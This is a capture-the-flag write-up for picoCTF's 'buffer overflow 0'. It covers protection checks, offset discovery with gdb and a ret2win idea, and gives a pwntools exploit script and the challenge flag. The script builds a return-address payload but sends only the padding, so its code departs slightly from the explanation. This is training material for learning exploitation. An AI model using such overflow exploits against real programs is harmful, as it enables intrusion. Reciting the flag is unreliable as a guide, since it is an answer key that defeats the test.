# buffer overflow 0
#### Write-up author : vreshco
## DESCRIPTION:
Smash the stack Let's start off simple, can you overflow the correct buffer? 
The program is available [here](https://github.com/jon-brandy/CTF-WRITE-UP/blob/3505b54dcda38d2f82a13a3f0c10dca01ed65735/Asset/buffer%20overflow%200/vuln). You can view source [here](https://github.com/jon-brandy/CTF-WRITE-UP/blob/3505b54dcda38d2f82a13a3f0c10dca01ed65735/Asset/buffer%20overflow%200/vuln.c). 
And connect with it using: 
`nc saturn.picoctf.net 51110`

## HINTS:
1. How can you trigger the flag to print?
2. If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.
3. Run man gets and read the BUGS section. How many characters can the program really read?

## STEPS:
1. First, download both files given.
2. Next, let's check the file type.

> RESULT - BINARY FILE 32 BIT, NOT STRIPPED.

![image](https://user-images.githubusercontent.com/70703371/216072363-65882ebe-5259-452e-9b9a-e25eb1dbbfb7.png)


3. Since it's a binary file, let's check the binary's protections.

> RESULT - NO CANARY FOUND

![image](https://user-images.githubusercontent.com/70703371/216072557-4e367ab0-d907-4f66-a140-88e87b14764f.png)


4. Since there's no canary found, hence we don't need to worry about the canary, we can utilize the bufferoverflow concept.
5. Start by run the binary using gdb and input cyclic 1024 pattern.

> RESULT - THE PROGRAM CRASHED


![image](https://user-images.githubusercontent.com/70703371/216072902-59f349d2-2ba3-4590-b2a7-b34833974e6c.png)


6. As you can see, we succesfully overwrite the EBP.
7. To know the correct offset, simply run `cyclic -l haaa` (get the 4 characters from **EIP**.

![image](https://user-images.githubusercontent.com/70703371/216073235-dac0d415-cd49-4bf6-9d32-64d105a6a497.png)


8. Great the correct offset is 28 bytes, hence we need to add 24 bytes as the padding. 
9. Now to know the flag locations, let's read the source code.

![image](https://user-images.githubusercontent.com/70703371/216073489-5c3b09f2-ff44-47fa-9aa4-a3d05a6f6393.png)


10. Looks like the `sigsev_handler` functions shall be our interest now.
11. Let's try to jump to the function by adding 24 bytes as the padding. This is a **ret2win** concept.
12. Now get the address of `sigsev_handler` using gdb.

> RESULT


![image](https://user-images.githubusercontent.com/70703371/216073949-cf6ff879-b78b-4fa7-a3aa-55a008c66852.png)


13. To solve this challenge i made a python script with **pwntools**.

> THE SCRIPT

```py
#python3
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)


exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

sh = start()

offset = b'A' * 24 # EIP -> 28

p = flat([
    offset,
    0x130d
])

sh.sendlineafter(': ', offset)

sh.interactive()
```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/216074264-e52624b5-84b2-447c-9095-65b06f2d37c6.png)


14. Got the flag!

## FLAG

```
picoCTF{ov3rfl0ws_ar3nt_that_bad_8ba275ff}
```

